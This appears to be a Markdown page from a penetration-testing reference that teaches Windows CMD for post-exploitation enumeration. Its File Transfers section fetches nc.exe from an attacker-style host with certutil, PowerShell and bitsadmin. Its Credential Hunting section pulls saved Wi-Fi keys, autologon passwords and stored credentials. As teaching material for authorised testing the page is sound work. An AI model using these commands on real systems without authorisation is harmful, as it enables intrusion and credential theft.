% Filename: 01-fundamentals/windows-basics/cmd-basics.md
% Display name: CMD Basics
% Last update: 2026-02-11
% ATT&CK Tactics: N/A
% ATT&CK Techniques: N/A
% Authors: @TristanInSec

# CMD Basics

## Overview

The Windows Command Prompt (`cmd.exe`) is the default command-line interpreter on Windows. It predates PowerShell and remains widely used for system administration, batch scripting, and post-exploitation. During engagements, CMD is often the first shell obtained — through a web shell, reverse shell, or service exploit. Knowing CMD well means faster enumeration, lateral movement, and persistence without needing to upgrade to PowerShell (which may trigger additional logging and defenses).

## Key Concepts

### Navigation and File Operations

```cmd
:: Print current directory
cd

:: Change directory
cd C:\Users\Public

:: List directory contents
dir

:: List with hidden and system files
dir /a

:: List recursively
dir /s C:\Users\*.txt

:: Create directory
mkdir C:\Temp\staging

:: Copy file
copy C:\Users\admin\Desktop\creds.txt C:\Temp\

:: Move file
move C:\Temp\creds.txt C:\Temp\staging\

:: Delete file
del C:\Temp\staging\creds.txt

:: Delete directory and contents
rmdir /s /q C:\Temp\staging

:: Display file contents
type C:\Windows\System32\drivers\etc\hosts

:: Page through long files
more C:\Windows\System32\config\system.ini
```

### Environment Variables

Environment variables store system and user configuration. They reveal paths, domain information, and architecture details useful during enumeration.

```cmd
:: Show all environment variables
set

:: Show specific variable
echo %USERNAME%
echo %COMPUTERNAME%
echo %USERDOMAIN%
echo %PATH%
echo %TEMP%
echo %USERPROFILE%
echo %SYSTEMROOT%
echo %PROCESSOR_ARCHITECTURE%

:: Set a variable (current session only)
set MYVAR=value

:: Set persistent user variable
setx MYVAR "value"

:: Set persistent system variable (requires admin)
setx /M MYVAR "value"
```

**Key variables for enumeration:**

```text
Variable                 Reveals
-----------------------  ---------------------------------
%USERNAME%               Current user
%USERDOMAIN%             Domain or computer name
%LOGONSERVER%            Authenticating DC
%COMPUTERNAME%           Hostname
%SYSTEMROOT%             OS install path (usually C:\Windows)
%PROCESSOR_ARCHITECTURE% 32-bit or 64-bit (AMD64, x86)
%PATH%                   Search paths for executables
%APPDATA%                Current user's roaming app data
%PROGRAMFILES%           Default install path for 64-bit apps
%PROGRAMFILES(X86)%      Default install path for 32-bit apps
```

### Searching for Files and Content

```cmd
:: Find files by name (recursive)
dir /s /b C:\Users\*.kdbx
dir /s /b C:\Users\*.config

:: Find files modified today
forfiles /P C:\ /S /D +0 /C "cmd /c echo @path"

:: Search file contents (like grep)
findstr /s /i "password" C:\Users\*.txt
findstr /s /i "password" C:\inetpub\*.config

:: Search with regex
findstr /r /s "passw[o0]rd" C:\*.xml

:: Find executable location (like which)
where notepad.exe
where /R C:\Users *.exe
```

**findstr flags:**

```text
Flag   Purpose
-----  ---------------------------------
/s     Search subdirectories recursively
/i     Case-insensitive
/r     Regular expression
/n     Show line numbers
/m     Show only filenames (not content)
/c:    Literal string (use when string has spaces)
```

### System Information

```cmd
:: Full system info (OS, patches, domain, NIC config)
systeminfo

:: OS version
ver

:: Hostname
hostname

:: Architecture
echo %PROCESSOR_ARCHITECTURE%

:: Installed patches
wmic qfe list brief

:: Installed software
wmic product get Name,Version,Vendor

:: Drives
wmic logicaldisk get DeviceID,FileSystem,FreeSpace,Size

:: Running processes
tasklist

:: Processes with services
tasklist /svc

:: Scheduled tasks
schtasks /query /fo LIST /v
```

### User and Group Enumeration

```cmd
:: Current user identity
whoami

:: Current user privileges
whoami /priv

:: Current user groups
whoami /groups

:: Full token info (SID, groups, privileges)
whoami /all

:: List local users
net user

:: Detailed user info
net user Administrator

:: List local groups
net localgroup

:: Members of Administrators
net localgroup Administrators

:: Domain users (if domain-joined)
net user /domain

:: Domain groups
net group /domain

:: Domain Admins members
net group "Domain Admins" /domain

:: Account policy (lockout threshold, password policy)
net accounts
net accounts /domain
```

### Network Enumeration

```cmd
:: IP configuration
ipconfig
ipconfig /all

:: DNS cache
ipconfig /displaydns

:: ARP table (discover hosts on local subnet)
arp -a

:: Routing table
route print

:: Active connections and listening ports
netstat -ano

:: Connections with process names (requires admin)
netstat -anob

:: Network shares on local machine
net share

:: Connect to remote share
net use \\10.10.10.5\C$ /user:DOMAIN\user password

:: List connected shares
net use

:: Current SMB sessions (requires admin)
net session

:: DNS lookup
nslookup <hostname>
nslookup <hostname> <dns-server>

:: Firewall status
netsh advfirewall show allprofiles

:: Firewall rules
netsh advfirewall firewall show rule name=all
```

### Service Management

```cmd
:: List all services
sc query type= service state= all

:: Query specific service config
sc qc <ServiceName>

:: Show service security descriptor (permissions)
sc sdshow <ServiceName>

:: Start / stop a service
net start <ServiceName>
net stop <ServiceName>

:: Show running services
net start

:: List services with WMIC
wmic service get Name,DisplayName,PathName,StartMode,StartName

:: Find unquoted service paths (privesc vector)
wmic service get Name,PathName | findstr /i /v "C:\Windows" | findstr /i /v """"
```

### WMIC (Windows Management Instrumentation)

> **Deprecated:** WMIC was deprecated in Windows 10 21H2 and is disabled by default on Windows 11 23H2+. It may not be present on modern targets. Use PowerShell CIM cmdlets (`Get-CimInstance`) instead. Note: `Get-WmiObject` is also deprecated since PowerShell 3.0 and absent in PowerShell 7+.

WMIC provides access to system management data. Useful for enumeration on legacy Windows targets.

```cmd
:: System info
wmic os get Caption,Version,BuildNumber,OSArchitecture

:: Processes with command lines
wmic process get ProcessId,Name,CommandLine

:: Services and their run-as accounts
wmic service get Name,StartName,PathName,State

:: Local user accounts
wmic useraccount get Name,SID,Status

:: Network adapters
wmic nicconfig get IPAddress,MACAddress,DefaultIPGateway

:: Startup programs
wmic startup get Caption,Command,Location

:: Installed software
wmic product get Name,Version

:: Shares
wmic share get Name,Path,Status

:: Group membership
wmic path win32_groupuser
```

### Piping and Redirection

```cmd
:: Pipe output to another command
tasklist | findstr "svchost"
netstat -ano | findstr "LISTENING"
systeminfo | findstr /i "domain"

:: Redirect output to file (overwrite)
systeminfo > C:\Temp\sysinfo.txt

:: Redirect output to file (append)
ipconfig /all >> C:\Temp\sysinfo.txt

:: Suppress error output
dir C:\nonexistent 2>nul

:: Redirect both stdout and stderr to file
systeminfo > C:\Temp\output.txt 2>&1
```

### File Transfers

When tools need to be transferred to a target via CMD:

```cmd
:: Download with certutil (built-in, commonly used)
certutil -urlcache -split -f http://10.10.14.1/nc.exe C:\Temp\nc.exe

:: Download with PowerShell (from CMD)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.1/nc.exe','C:\Temp\nc.exe')"

:: Download with bitsadmin (built-in)
bitsadmin /transfer job /download /priority high http://10.10.14.1/nc.exe C:\Temp\nc.exe

:: Copy from SMB share
copy \\10.10.14.1\share\nc.exe C:\Temp\nc.exe

:: FTP (if available)
ftp -s:commands.txt 10.10.14.1
```

### Batch Scripting Basics

```cmd
:: Variables
set TARGET=10.10.10.5

:: If/else
if exist C:\Temp\nc.exe (echo Found) else (echo Not found)

:: For loop — iterate over command output
for /f "tokens=*" %i in ('tasklist /fi "imagename eq svchost.exe"') do @echo %i

:: For loop in batch file (use %% instead of %)
for /f "tokens=*" %%i in ('net user /domain') do @echo %%i

:: Ping sweep (batch one-liner)
for /L %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i | findstr "Reply"

:: Command chaining
dir C:\Temp && echo "Directory exists"
dir C:\Temp || echo "Directory not found"
```

## Practical Examples

### Quick Enumeration Script

```cmd
:: One-liner: dump key info to file
hostname & whoami & whoami /priv & ipconfig /all & netstat -ano & net user & net localgroup Administrators & systeminfo > C:\Temp\enum.txt 2>&1
```

### Credential Hunting

```cmd
:: Search for passwords in common file types
findstr /s /i "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini C:\Users\*.config

:: Check for saved wireless credentials
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

:: Registry autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

:: Saved credentials in Credential Manager
cmdkey /list

:: Unattend files (may contain base64 passwords)
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml
```

## References

### Microsoft Documentation

- [Windows Commands A-Z](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
- [CMD Command Reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)
- [findstr Command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)
- [where Command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/where)
- [for Command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/for)
- [icacls Command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
- [netstat Command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netstat)
- [sc query Command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query)
- [wmic Command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic)
